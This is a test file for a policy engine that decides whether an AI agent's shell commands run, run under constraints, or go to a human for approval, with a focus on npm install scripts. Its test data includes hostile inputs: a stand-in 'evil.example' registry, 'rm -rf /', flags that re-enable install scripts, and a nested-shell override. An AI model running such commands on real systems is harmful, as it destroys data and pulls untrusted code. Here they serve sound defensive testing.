/**
 * CL-11 slice 2 — the decision and its enforcement.
 *
 * The policy, decided by the owner and not re-opened here: an install that runs
 * lifecycle scripts is met with a CONSTRAINT on `allow`, not a blanket
 * escalation. The constraint is an environment overlay, never a rewrite of the
 * command. Where no MEASURED overlay covers the command — or where the command
 * could undo it — the answer is `ask`, because announcing a protection the
 * enforcement point cannot deliver is worse than asking.
 */
import { describe, expect, test } from "bun:test"
import { CONTROL_CONTRACT_VERSION, decisionHash, controlRecord, type ControlRequest, type Constraint } from "@abdo/control-contracts"
import { assessCall, BuiltinPolicyDecisionPoint, policy, PolicyToolRunner, ToolRegistry } from "../src/index"
import type { ToolContext } from "../src/index"

const pdp = new BuiltinPolicyDecisionPoint(() => "apr_test")

const requestFor = (command: string, risk: "low" | "high" = "low"): ControlRequest => {
  const { operation, risk: assessed, capability, lifecycle, installSource } = assessCall("shell", policy({ risk }), { command })
  return {
    version: CONTROL_CONTRACT_VERSION,
    sessionId: "s", runId: "r", attemptId: 1, requestId: "q", toolExecutionId: "t",
    actor: { agent: "a", model: "m", provider: "p" },
    tool: "shell", capability,
    target: { kind: "workspace", workspace: "/w" },
    normalizedOperation: operation, risk: assessed,
    argsHash: "h", secretRefs: [], provenance: [],
    ...(lifecycle ? { lifecycle } : {}),
    ...(installSource ? { installSource } : {}),
  }
}
const decide = (command: string) => pdp.decide(requestFor(command))
const constraintsOf = (command: string): readonly Constraint[] => {
  const d = decide(command)
  return d.action === "allow" ? d.constraints : []
}

describe("CL-11.6 the decision", () => {
  test("`npm ci` is the only install SHAPE that can allow — but only once the workspace is VERIFIED", () => {
    // `npm ci` reproduces the lockfile and fails if it is missing or mismatched,
    // so its command-side source is pinned. But the workspace (.npmrc, resolved
    // hosts, integrity) is a filesystem fact, so it is FAIL-CLOSED: without a
    // verifier the workspace is `unknown` and `npm ci` asks. The dedicated
    // supply-chain gate test covers the verified path; here it is `ask`.
    expect(decide("npm ci").action).toBe("ask")
    expect(decide("npm ci").reasonCode).toBe("install_source_not_verified")
  })

  test("`npm install` RESOLVES and rewrites the lockfile — a supply-chain decision, so ASK", () => {
    // The removal of the old resource floor for installs must NOT become a
    // general auto-allow. `npm install` changes what is installed, so it asks.
    const d = decide("npm install")
    expect(d.action).toBe("ask")
    expect(d.reasonCode).toBe("install_source_not_verified")
    for (const cmd of ["npm i", "npm install lodash", "npm add react", "npm update"]) {
      expect(decide(cmd).action).toBe("ask")
    }
  })

  test("a custom registry, or a git/URL/tarball source, is ASK even for `npm ci`", () => {
    for (const cmd of [
      "npm ci --registry https://evil.example/",
      "npm_config_registry=https://evil.example/ npm ci",
      "npm ci && npm install git+https://github.com/x/y.git",
    ]) {
      const d = decide(cmd)
      expect(d.action).toBe("ask")
      expect(d.reasonCode).toBe("install_source_not_verified")
    }
  })

  test("an install NEXT TO code execution stays `ask` — the node keeps it conservative", () => {
    // The narrowing that keeps the safe path from becoming a hole: the bounded-
    // install relaxation applies only when EVERY capability is install-family.
    expect(decide("npm ci && node ./s.js").action).toBe("ask")
    expect(decide("node app.js").action).toBe("ask")
  })

  test("`npm test` reaches allow; the constraint SUPPRESSES ITS pre/post, not the test script", () => {
    // The corrected semantics. `npm test` is explicit code execution — it passed
    // the risk gates on its own. The constraint rides along to strip pretest/
    // posttest (implicit), and the summary carries env key NAMES, never values.
    const d = decide("npm test")
    expect(d.action).toBe("allow")
    expect(constraintsOf("npm test")).toEqual([
      { kind: "suppressImplicitLifecycleScripts", value: true, env: { npm_config_ignore_scripts: "true" } },
    ])
    // And the request records that the named script IS explicit execution —
    // so no one downstream reads the constraint as having blocked it.
    expect(requestFor("npm test").lifecycle).toMatchObject({ explicitCodeExecution: true })
  })

  test("implicit pre/post of a named script are the suppressible part", () => {
    expect(constraintsOf("npm run")).toHaveLength(1)
    expect(constraintsOf("npm start")).toHaveLength(1)
  })

  test("a command that runs no scripts gets a plain, unconstrained allow", () => {
    const d = decide("git status")
    expect(d.action).toBe("allow")
    expect(constraintsOf("git status")).toEqual([])
  })

  test("no proven overlay => ASK, with its own reason code — never a bare allow", () => {
    // yarn/bun/pnpm were MEASURED to ignore the variable (or could not be
    // proven), so the same command shape that npm gets allowed-with-constraint
    // for is refused to them by name.
    for (const cmd of ["yarn test", "bun test", "pnpm test"]) {
      const d = decide(cmd)
      expect(d.action).toBe("ask")
      expect(d.reasonCode).toBe("lifecycle_scripts_not_suppressible")
    }
    // The install-shaped ones ask too; they are simply caught one gate earlier.
    for (const cmd of ["yarn install", "pip install requests", "cargo build"]) {
      expect(decide(cmd).action).toBe("ask")
    }
  })

  test("a command that could undo the constraint is ASK, not a constrained allow", () => {
    // Every one of these was MEASURED to run the scripts with the overlay set.
    for (const cmd of [
      "npm test --ignore-scripts=false",
      "npm test --no-ignore-scripts",
      "npm_config_ignore_scripts=false npm test",
      "env npm_config_ignore_scripts=false npm test",
    ]) {
      const d = decide(cmd)
      expect(d.action).toBe("ask")
      expect(d.reasonCode).toBe("lifecycle_scripts_not_suppressible")
    }
    // A nested shell that sets the key is caught as well — here the parser
    // reports it, one gate earlier.
    expect(decide("bash -c 'export npm_config_ignore_scripts=false; npm test'").action).toBe("ask")
  })

  test("an unmodelled program beside a script command still escalates — through the risk path", () => {
    // The lifecycle layer deliberately does not judge `xargs`; the capability
    // classifier does not recognise it either, which makes the operation
    // conservative. The end result is what matters: nothing runs unasked.
    expect(decide("npm test && xargs sh").action).toBe("ask")
  })

  test("a dangerous or high-risk command outranks the constraint — ask still wins", () => {
    const dangerous = decide("rm -rf / && npm test")
    expect(dangerous.action).toBe("ask")
    expect(dangerous.reasonCode).toBe("dangerous_command_requires_approval")
    const high = pdp.decide(requestFor("npm test", "high"))
    expect(high.action).toBe("ask")
    expect(high.reasonCode).toBe("high_risk_requires_approval")
  })
})

describe("CL-11.7 the record states what was enforced", () => {
  test("decisionHash MOVES when the constraints move", () => {
    const request = requestFor("npm test")
    const constrained = pdp.decide(request)
    const bare = { ...constrained, constraints: [] } as typeof constrained
    expect(constrained.action).toBe("allow")
    expect(decisionHash(request, constrained)).not.toBe(decisionHash(request, bare))
    // ...and is stable for the same constraints, or it would be useless.
    expect(decisionHash(request, constrained)).toBe(decisionHash(request, pdp.decide(request)))
  })

  test("the record carries kinds + env key NAMES, never values", () => {
    // The durable record must be safe to keep forever: an overlay could one day
    // carry a token, so only the KEY name is recorded, never what it was set to.
    const request = requestFor("npm test")
    const record = controlRecord(request, pdp.decide(request))
    expect(record.constraints).toEqual([{ kind: "suppressImplicitLifecycleScripts", envKeys: ["npm_config_ignore_scripts"] }])
    expect(JSON.stringify(record.constraints)).not.toContain("true") // no value leaked
    // An unconstrained allow says so by omission rather than by an empty array.
    expect(controlRecord(requestFor("git status"), pdp.decide(requestFor("git status"))).constraints).toBeUndefined()
  })
})

describe("CL-11.8 enforcement is real or nothing runs", () => {
  const spyTool = (honorsEnvOverlay: boolean) => {
    let seen: ToolContext | undefined
    const registry = new ToolRegistry().register({
      name: "shell",
      policy: policy({ risk: "low" }),
      ...(honorsEnvOverlay ? { honorsEnvOverlay: true } : {}),
      async run(_input, ctx: ToolContext) {
        seen = ctx
        return { ok: true as const, output: "ran" }
      },
    })
    return { registry, seen: () => seen }
  }

  test("the overlay reaches the tool, exactly as decided", async () => {
    const { registry, seen } = spyTool(true)
    const runner = new PolicyToolRunner(registry, { approver: { approve: async () => true } })
    const out = await runner.run({ name: "shell", input: { command: "npm test" } })
    expect(out.ok).toBe(true)
    expect(seen()?.envOverlay).toEqual({ npm_config_ignore_scripts: "true" })
    expect(out.control?.constraints).toEqual([{ kind: "suppressImplicitLifecycleScripts", envKeys: ["npm_config_ignore_scripts"] }])
  })

  test("tool.started's preview matches the enforced decision — kinds + key NAMES only", () => {
    const { registry } = spyTool(true)
    const runner = new PolicyToolRunner(registry, { approver: { approve: async () => true } })
    // describeEnforcement is the pure preview the runtime records on tool.started.
    expect(runner.describeEnforcement({ name: "shell", input: { command: "npm test" } })).toEqual([
      { kind: "suppressImplicitLifecycleScripts", envKeys: ["npm_config_ignore_scripts"] },
    ])
    expect(runner.describeEnforcement({ name: "shell", input: { command: "git status" } })).toEqual([])
    // An ask carries no constraint preview.
    expect(runner.describeEnforcement({ name: "shell", input: { command: "yarn test" } })).toEqual([])
  })

  test("FAIL CLOSED: a tool that cannot apply the overlay does not run at all", async () => {
    // The alternative would be an execution whose durable record claims a
    // protection that never existed — worse than a refusal.
    const { registry, seen } = spyTool(false)
    const runner = new PolicyToolRunner(registry, { approver: { approve: async () => true } })
    const out = await runner.run({ name: "shell", input: { command: "npm test" } })
    expect(out.ok).toBe(false)
    if (out.ok) throw new Error("unreachable")
    expect(out.error).toContain("constraint_not_enforceable")
    expect(seen()).toBeUndefined() // never entered the tool
  })

  test("an unconstrained call is untouched — no overlay is invented", async () => {
    const { registry, seen } = spyTool(true)
    const runner = new PolicyToolRunner(registry, { approver: { approve: async () => true } })
    await runner.run({ name: "shell", input: { command: "git status" } })
    expect(seen()?.envOverlay).toBeUndefined()
  })

  test("an APPROVED command runs as written: explicit human permission, no silent constraint", async () => {
    // The human was asked about the command they saw. Quietly neutering it
    // afterwards would make the approval mean something else than it said.
    const { registry, seen } = spyTool(true)
    const runner = new PolicyToolRunner(registry, { approver: { approve: async () => true } })
    const out = await runner.run({ name: "shell", input: { command: "yarn test" } })
    expect(out.ok).toBe(true)
    expect(seen()?.envOverlay).toBeUndefined()
    expect(out.control?.constraints).toBeUndefined()
    expect(out.control?.reasonCode).toBe("approval_granted")
  })

  test("a DENIED command never reaches the tool, constrained or not", async () => {
    const { registry, seen } = spyTool(true)
    const runner = new PolicyToolRunner(registry, { approver: { approve: async () => false } })
    const out = await runner.run({ name: "shell", input: { command: "yarn test" } })
    expect(out.ok).toBe(false)
    expect(seen()).toBeUndefined()
  })
})
